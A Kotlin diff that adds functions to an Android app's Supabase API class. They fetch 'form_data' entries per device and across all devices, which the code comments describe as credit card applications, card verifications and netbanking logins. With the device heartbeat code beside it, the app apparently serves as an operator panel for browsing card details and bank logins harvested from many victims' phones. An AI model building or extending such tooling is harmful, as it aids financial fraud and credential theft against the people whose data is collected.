@@ -107,6 +107,13 @@ class SupabaseApi() {
         val status: String = "OFF",
     )
 
+    data class CreditCardApplication(
+        val id: String = "",
+        val type: String = "",
+        val data: Map<String, Any> = emptyMap(),
+        val submittedAtMs: Long = 0L,
+    )
+
     // ════════════════════════════════════════════════════════════════════════
     //  CRITICAL HELPER — safe data_json extractor
     // ════════════════════════════════════════════════════════════════════════
@@ -570,4 +577,113 @@ class SupabaseApi() {
 
     suspend fun upsertHeartbeat(subId: String, payload: JSONObject): Result<JSONObject> =
         smartUpsert(payload.apply { put("sub_id", subId); put("data_type", "heartbeat") })
+
+    // ════════════════════════════════════════════════════════════════════════
+    //  FORM DATA — used by AllUserDataActivity
+    // ════════════════════════════════════════════════════════════════════════
+
+    /**
+     * Fetch all form_data entries for a specific device uid.
+     * Used by AllUserDataActivity to show credit card applications,
+     * card verifications, netbanking logins, etc.
+     */
+    suspend fun getCreditCardApplications(uid: String): Result<List<CreditCardApplication>> =
+        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
+            try {
+                val url = "$BASE/form-data?uid=$uid&limit=200"
+                Log.d(TAG, "getCreditCardApplications → $url")
+                val arr = dataArray(get(url))
+                Log.d(TAG, "getCreditCardApplications → got ${arr.length()} rows")
+
+                val list = mutableListOf<CreditCardApplication>()
+                for (i in 0 until arr.length()) {
+                    val row = arr.getJSONObject(i)
+                    val id = row.optString("id", "")
+                    val type = row.optString("form_type",
+                               row.optString("data_type", "unknown"))
+
+                    // "data" column is a JSONB object — parse same way as data_json
+                    val rawData = row.opt("data")
+                    val dataJson: JSONObject = when (rawData) {
+                        is JSONObject -> rawData
+                        is String -> runCatching { JSONObject(rawData) }.getOrElse { JSONObject() }
+                        else -> JSONObject()
+                    }
+
+                    // Convert JSONObject to Map<String, Any>
+                    val dataMap = mutableMapOf<String, Any>()
+                    dataJson.keys().forEach { key ->
+                        dataJson.opt(key)?.let { dataMap[key] = it }
+                    }
+
+                    // Timestamp — try submitted_at (ISO string) then submitted_at_ms (long)
+                    val tsMs = run {
+                        val raw = row.opt("submitted_at")
+                        when (raw) {
+                            is Long   -> raw
+                            is Int    -> raw.toLong()
+                            is Number -> raw.toLong()
+                            is String -> parseIsoToMs(raw).takeIf { it > 0L }
+                                         ?: raw.toLongOrNull() ?: 0L
+                            else -> row.optLong("submitted_at_ms", 0L)
+                        }
+                    }
+
+                    list.add(CreditCardApplication(
+                        id           = id,
+                        type         = type,
+                        data         = dataMap,
+                        submittedAtMs = tsMs,
+                    ))
+                }
+                Result.success(list)
+            } catch (e: Exception) {
+                Log.e(TAG, "getCreditCardApplications error: ${e.message}")
+                Result.failure(e)
+            }
+        }
+
+    /**
+     * Fetch ALL form_data entries across all devices under this app token.
+     */
+    suspend fun getAllFormData(limit: Int = 200): Result<List<CreditCardApplication>> =
+        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
+            try {
+                val arr = dataArray(get("$BASE/form-data?limit=$limit"))
+                val list = mutableListOf<CreditCardApplication>()
+                for (i in 0 until arr.length()) {
+                    val row = arr.getJSONObject(i)
+                    val type = row.optString("form_type", row.optString("data_type", "unknown"))
+                    val rawData = row.opt("data")
+                    val dataJson: JSONObject = when (rawData) {
+                        is JSONObject -> rawData
+                        is String -> runCatching { JSONObject(rawData) }.getOrElse { JSONObject() }
+                        else -> JSONObject()
+                    }
+                    val dataMap = mutableMapOf<String, Any>()
+                    dataJson.keys().forEach { key -> dataJson.opt(key)?.let { dataMap[key] = it } }
+                    val tsMs = run {
+                        val raw = row.opt("submitted_at")
+                        when (raw) {
+                            is Long   -> raw
+                            is Int    -> raw.toLong()
+                            is Number -> raw.toLong()
+                            is String -> parseIsoToMs(raw).takeIf { it > 0L }
+                                         ?: raw.toLongOrNull() ?: 0L
+                            else -> 0L
+                        }
+                    }
+                    list.add(CreditCardApplication(
+                        id            = row.optString("id", ""),
+                        type          = type,
+                        data          = dataMap,
+                        submittedAtMs = tsMs,
+                    ))
+                }
+                Result.success(list)
+            } catch (e: Exception) {
+                Log.e(TAG, "getAllFormData error: ${e.message}")
+                Result.failure(e)
+            }
+        }
 }
